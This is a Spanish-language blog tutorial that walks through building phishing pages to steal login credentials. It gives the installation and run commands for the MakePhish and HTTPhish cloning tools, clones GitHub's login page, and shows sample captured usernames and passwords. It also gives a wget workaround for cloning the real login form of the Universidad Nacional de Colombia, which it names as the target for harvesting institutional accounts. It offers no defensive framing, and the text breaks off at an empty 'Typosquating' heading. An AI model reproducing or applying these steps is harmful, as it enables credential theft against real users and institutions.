
Vamos a demostrar lo fácil que es montar un sitio web de **phishing** para robar las credenciales del primer cibernauta incauto que pique la caña. 
La palabra *phishing* es un anglicismo que puede emplearse en lugar de "suplantación de identidad" [[?]​](https://www.facebook.com/RAE/posts/extranjerismos-phishingpara-evitar-el-anglicismo-phishing-se-pueden-emplear-en-s/4168733576480269/) y denota el intento de un atacante de extrase información sensible o simplemente perjudicar una victima enviandole un mensaje fraudulento o presentandose como alguien o algo que no es, como por ejemplo alguien de confianza, su jefe o su banco. En nuestro ejemplo no haremos pasar por el inicio de sesion de la universidad lo cual nos daría la posibildiad de capturar credenciales de cuentas institucionales

## Primero lo primero: el sevidor web
Al montar un página web falsa, pues, necesitamos donde alojar nuestra página que sea accesible desde cualquier parte del internet. El proceso del montaje del servidor web graiuto lo explicamos ya en el artículo [crear un servidor web con Google Cloud](https://fredyrosero.github.io/google%20cloud/2022/02/27/Crear-una-servidor-web-gr%C3%A1tis-con-Google-Cloud.html) donde configuramos el servidor *Apache* para que busque los archivos a servir en `/home/user/www`. Sin embargo, en vez de utilizar *Apache* vamos a utilizar el servidor web integrado de **PHP** [[?]](https://www.php.net/manual/en/features.commandline.webserver.php)

## Make Phish de @andpalmier
El programa `MakePhish` de [@andpalmier](https://github.com/andpalmier) nos permite clonar sitios web automáticamente y parchearlos con PHP para crear páginas de phishing
> This is a proof of concept to automatically create phishing kits based on a specified URL, please note that makephish will work exclusively on websites having a simple pages with `<form>` logins.

https://github.com/andpalmier/makephish

Procederemos a clonar la página de inicio de sesión de la Universidad Nacional para luego servirla en nuestro servidor web:

### Prerrequisitos
1. Instalmos `cURL`, `Git` y las los escenciales de compilación de linux:
    ```bash
    sudo apt update
    sudo apt install curl git build-essential
    ```

2. Instalamos `Go` y hacemos el comando accesible
    ```bash
    mkdir sandbox
    cd sandbox
    curl -O https://dl.google.com/go/go1.12.7.linux-amd64.tar.gz
    tar xvf go1.12.7.linux-amd64.tar.gz
    sudo chown -R root:root ./go
    sudo mv go /usr/local
    vim ~/.profile
    # export GOPATH=$HOME/work
    # export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
    ```

### Instalación de MakePhish
Clonamos el repositorio de `MakePhish` y compilamos el programa

```bash
mkdir ~/scripts
cd ~/scripts
git clone https://github.com/andpalmier/makephish
cd makephish
make makephish
```

### Ejecución
1. Clonaremos la página de inicio de sesión de *Github* que por defecto quedará en `kits/`
    ```bash
    URL="https://github.com/login/"
    cd ~/scripts/makephish
    ./build/makephish -url $URL
    ```
2. En el directorio creado en `kits/` lanzaremos el servidor de *PHP* con acceso remoto en el puerto 80 
    ```bash
    cd kits/github.com
    sudo php -S 0.0.0.0:80
    ```
3. La victima ingresaría sus credenciales y nuestra página impostora redirigirá el usuario a la página real de Github. Para este ejemplo usaremos `miUsuario` como usuario y `miContraseñ4` como contraseña.

4. Para ver las credenciales capturadas, vamos a la URL web `/log` de nuestro servidor, en esta caso con `curl localhost/log`:
    ```
    =============+=============
    Username/Email: miUsuario
    Password:       miContraseñ4
    IP:
    Date:           Mon Feb 28, 2022 7:25 am
    User Agent:     Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
    ===========================
    ``` 
#### Observaciones
El código intentará obtener el nodo HTML tipo formulario con el atributo `method` [[?]](https://github.com/andpalmier/makephish/blob/main/cmd/makephish/makephish.go#L44) y luego parchará el arhivo `index.html` de la carpeta de desitno. Si no encuentra un formulario o un logra crear el `index.html`, el programa no funcionará como son los siguientes casos:
* https://smartkey.xertica.com/cloudkey/a/unal.edu.co/user/login
* [https://autenticasia.unal.edu.co/oam/server/obrareq.cgi?](https://autenticasia.unal.edu.co/oam/server/obrareq.cgi?encquery%3Dn7f%2FxYMMCM%2F4eOGtG3zYDXS%2FYKJMx7poqUGEK2XYTFbLbKUhN5OGgkOvkmo8aAKkriiKmfxlaBHUyEVVm1%2BsyiUuYlUgBa%2FbwSvPuShhMnzLdQis1mr%2BehZ6Ma%2B2XlKCjJqTfp5pOZmkqxdgcQLfbF7M0AVOcGVb3xioCtiL0Ndy%2FMMGTFr%2BUQCrL5fwg%2BCCVeQ06%2BE4630RJALCUEgHWPH2KX9d70WVKZPyKgcVbzV48mDQ9PCdRc1SHIVKgIbT01%2FqS6XPPX9bDVTJP2v3z2TM%2F5i3NMwzZ%2BGOXSptYjw%3D%20agentid%3DWT_uncuxwebX%20ver%3D1%20crmethod%3D2&ECID-Context=1.005qGummJRv6MQRMyYbe6G000AW100DIea%3BkXjE)

## HTTPhish de @miguelangelramirez
> Quickly clone a website and launch an HTTP server to phish information with httphish.py
https://github.com/miguelangelramirez/httphish
### Prerrequisitos
Instalmos `wget` y `python3`
```bash
sudo apt update
sudo apt install wget python3
```
### Instalación
```bash
git clone https://github.com/miguelangelramirez/httphish.git
```
### Uso
Solo tenemos que ejecutar el siguiente comando e ingresar la URL del formlario del *login* y presionar *enter* para que python se encargue del servidor web en el puerto 80:
```bash
cd httphish
sudo python3 httphish.py
```
Las instrucciones completas estan disponibles [github.com/miguelangelramirez/httphish#how-to-use](https://github.com/miguelangelramirez/httphish#how-to-use) pero son tan sencillas como

1. Definir si se quiere (clonar) descagar el login con `wget`
2. Ingresar la URL del fomrulario a clonar
3. Definir el tipo de navegador (User Agent) que simplemete se puede dejar el por defecto
4. Definir el dominio (no la URL completa) de redirección
5. Consultar en el arhivo `post.txt` las credenciales capturadas de las variables POST: 
    ```txt
    username=hola&password=MUNDO%21&submit=Iniciar+Sesi%C3%B3n
    ```
6. Luego de finalizar y antes de intentar clonar otro formulario corremos `sudo python3 cleanup.py`

### Ensayos
#### Github
El [login de Github](view-source:https://github.com/login/) solicita [una hoja de estilos framework](view-source:https://github.githubassets.com/assets/frameworks-403b2d0d5d0279a4c043.css) 





#### SIA
En el navegador solicitamos la URL https://sia.unal.edu.co/ServiciosApp la cual nos redireccionará a
[https://autenticasia.unal.edu.co/oam/server/obrareq.cgi?encquery%3Dn7f%2FxYMMC...](https://autenticasia.unal.edu.co/oam/server/obrareq.cgi?encquery%3Dn7f%2FxYMMCM%2F4eOGtG3zYDXS%2FYKJMx7poqUGEK2XYTFbLbKUhN5OGgkOvkmo8aAKkriiKmfxlaBHUyEVVm1%2BsyiUuYlUgBa%2FbwSvPuShhMnzLdQis1mr%2BehZ6Ma%2B2XlKCjJqTfp5pOZmkqxdgcQLfbF7M0AVOcGVb3xioCtiL0Ndy%2FMMGTFr%2BUQCrL5fwg%2BCCVeQ06%2BE4630RJALCUEgHWPH2KX9d70WVKZPyKgcVbzV48mDQ9PCdRc1SHIVKgIbT01%2FqS6XPPX9bDVTJP2v3z2TM%2F5i3NMwzZ%2BGOXSptYjw%3D%20agentid%3DWT_uncuxwebX%20ver%3D1%20crmethod%3D2&ECID-Context=1.005qGummJRv6MQRMyYbe6G000AW100DIea%3BkXjE) esta última es la página que contiene el formulario de login. Pero la URL es demasiado larga (`"The name is too long, 373 chars total."`) para el programa lo que ocasionará un bug que descargará todos los recursos en la raíz y no en `web`. La solución es sencilla: 
1. Replica la instrucción de [[httphish.py#L56]](https://github.com/miguelangelramirez/httphish/blob/master/httphish.py#L56) descargando manualmente los archivos con
    ```bash
    mkdir web
    URL_PHISH="https://autenticasia.unal.edu.co/oam/server/obrareq.cgi?encquery%3Dn7f%2FxYMMCM%2F4eOGtG3zYDXS%2FYKJMx7poqUGEK2XYTFbLbKUhN5OGgkOvkmo8aAKkriiKmfxlaBHUyEVVm1%2BsyiUuYlUgBa%2FbwSvPuShhMnzLdQis1mr%2BehZ6Ma%2B2XlKCjJqTfp5pOZmkqxdgcQLfbF7M0AVOcGVb3xioCtiL0Ndy%2FMMGTFr%2BUQCrL5fwg%2BCCVeQ06%2BE4630RJALCUEgHWPH2KX9d70WVKZPyKgcVbzV48mDQ9PCdRc1SHIVKgIbT01%2FqS6XPPX9bDVTJP2v3z2TM%2F5i3NMwzZ%2BGOXSptYjw%3D%20agentid%3DWT_uncuxwebX%20ver%3D1%20crmethod%3D2&ECID-Context=1.005qGummJRv6MQRMyYbe6G000AW100DIea%3BkXjE"
    wget -E -H -k -K -p -nH --cut-dirs=100 -nv $URL_PHISH --directory-prefix=web
    ```
2. Renombra el archivo `obrareq.cgi?encquery%3DAUN...` a uno mas corto como `index.cgi`
3. Lanza de nuevo el programa 
4. Ingresa `"n"` en `"Do you want to automatically download the page with wget?:"` 
5. Ingresas el nombre del archivo del formulario  como `index.cgi`
6. Colocas `sia.unal.edu.co/ServiciosApp` como dominio de redirección.

#### Login UNAL
https://smartkey.xertica.com/cloudkey/a/unal.edu.co/user/login


## Typosquating
